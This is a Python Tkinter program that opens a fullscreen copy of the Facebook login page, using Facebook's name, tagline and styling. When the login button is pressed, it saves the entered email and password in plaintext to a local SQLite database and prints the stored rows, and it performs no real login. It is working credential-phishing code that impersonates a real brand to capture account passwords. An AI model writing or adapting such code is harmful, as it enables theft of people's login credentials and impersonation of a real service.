import sqlite3
from tkinter import *

class FacebookLogin(Tk):
    def __init__(self):
        super().__init__()
        self.attributes("-fullscreen", True)  # Start in fullscreen mode

        # Create a SQLite database connection
        self.conn = sqlite3.connect("user_data.db")
        self.cursor = self.conn.cursor()  # Define the cursor here

    def create_database(self):
        # Create a table for user data if it doesn't exist
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')

    def label(self):
        # Adjust the x-coordinate of the canvas to move the entire white box
        self.canvas = Canvas(self, width=420, height=378, bg="#fffcfc")
        self.canvas.place(x=1020, y=185)  # Adjust the x-coordinate

        self.canvas.create_line(28, 260, 400, 260)

        self.title = Label(self, text="facebook", font="Arial 43 bold", fg="#427bff")
        self.title.place(x=330, y=210)  # Adjust the x-coordinate

        self.facebooktagline1 = Label(self, text="Facebook helps you connect and share", font="Leelawadee 20", fg="black")
        self.facebooktagline1.place(x=330, y=290)  # Adjust the x-coordinate

        self.facebooktagline2 = Label(self, text="with the people in your life.", font="Leelawadee 20", fg="black")
        self.facebooktagline2.place(x=330, y=323)  # Adjust the x-coordinate

        self.bannerpic = PhotoImage(file=r'C:\Users\HP\Downloads\facebook_login_page\facebook_login_page\upperbar.PNG')
        self.banner = Label(self, image=self.bannerpic)
        self.banner.place(x=0, y=0)

        # Load the image for the lower portion
        self.lowpic = PhotoImage(file=r'C:\Users\HP\Downloads\facebook_login_page\facebook_login_page\Capture.PNG')

        # Get the width and height of the image
        lowpic_width = self.lowpic.width()
        lowpic_height = self.lowpic.height()

        # Calculate the position to place the image at the bottom of the window
        x_position = 0  # You can adjust this if needed
        y_position = self.winfo_screenheight() - lowpic_height  # Places it at the bottom of the screen

        # Create a label for the lower portion image and place it
        self.lowpic_label = Label(self, image=self.lowpic)
        self.lowpic_label.place(x=x_position, y=y_position)

        # Update the window to ensure the image is displayed
        self.update()
        self.cursor.execute("SELECT * FROM users")
        rows = self.cursor.fetchall()
        print("Fetched data:")
        for row in rows:
            print(row)

    def entry(self):
        # Entry for email address
        self.email_var = StringVar()
        self.email = Entry(self, textvariable=self.email_var, width=30, font="Courier", highlightthickness=1, fg="grey")
        self.email_var.set('Email address or phone number')
        self.email.bind("<FocusIn>", self.clear_email_placeholder)
        self.email.bind("<FocusOut>", self.restore_email_placeholder)
        self.email.place(x=1057, y=217, height=50)

        # Entry for password
        self.password_var = StringVar()
        self.password = Entry(self, textvariable=self.password_var, width=30, font="Courier", highlightthickness=1, fg="grey")
        self.password_var.set('Password')
        self.password.bind("<FocusIn>", self.clear_password_placeholder)
        self.password.bind("<FocusOut>", self.restore_password_placeholder)
        self.password.place(x=1057, y=277, height=50)

    def clear_email_placeholder(self, event):
        if self.email_var.get() == 'Email address or phone number':
            self.email.delete(0, END)
            self.email.config(fg="black")  # Change text color to black when cleared

    def restore_email_placeholder(self, event):
        if not self.email_var.get():
            self.email_var.set('Email address or phone number')
            self.email.config(fg="grey")  # Change text color to grey when restored

    def clear_password_placeholder(self, event):
        if self.password_var.get() == 'Password':
            self.password.delete(0, END)
            self.password.config(show="*")  # Mask password with asterisks
            self.password.config(fg="black")  # Change text color to black when cleared

    def restore_password_placeholder(self, event):
        if not self.password_var.get():
            self.password_var.set('Password')
            self.password.config(show="")
            self.password.config(fg="grey")  # Change text color to grey when restored

    def button(self):
        self.buttonImage = PhotoImage(file=r'C:\Users\HP\Downloads\facebook_login_page\facebook_login_page\button.png')
        self.button = Button(self, image=self.buttonImage, command=self.loginFunction, border=0)
        self.button.place(x=1041, y=340)

        self.forgotpass = Button(self, text="Forgotten password?", command=self.forgot_password, border=0, bg="white", fg="blue", font="Leelawadee 10")
        self.forgotpass.place(x=1171, y=410)

        self.newaccbuttonImage = PhotoImage(file=r'C:\Users\HP\Downloads\facebook_login_page\facebook_login_page\newaccountbutton.png')
        self.newaccbutton = Button(self, image=self.newaccbuttonImage, command=self.create_new_account, border=0)
        self.newaccbutton.place(x=1121, y=470)

    def create_new_account(self):
        # Handle the logic for creating a new account here
        pass

    def forgot_password(self):
        # Handle the logic for forgotten password here
        pass

    def loginFunction(self):
        # Get the email address and password from the Entry fields
        email = self.email.get()
        password = self.password.get()

        # Store the data in the local database
        self.insert_data(email, password)

        # Clear the Entry fields after storing data
        self.email.delete(0, END)
        self.password.delete(0, END)

    def insert_data(self, username, password):
        # Insert user data into the database
        self.cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
        self.conn.commit()
        



if __name__ == "__main__":
    windows = FacebookLogin()
    windows.label()
    windows.entry()
    windows.button()
    windows.mainloop()
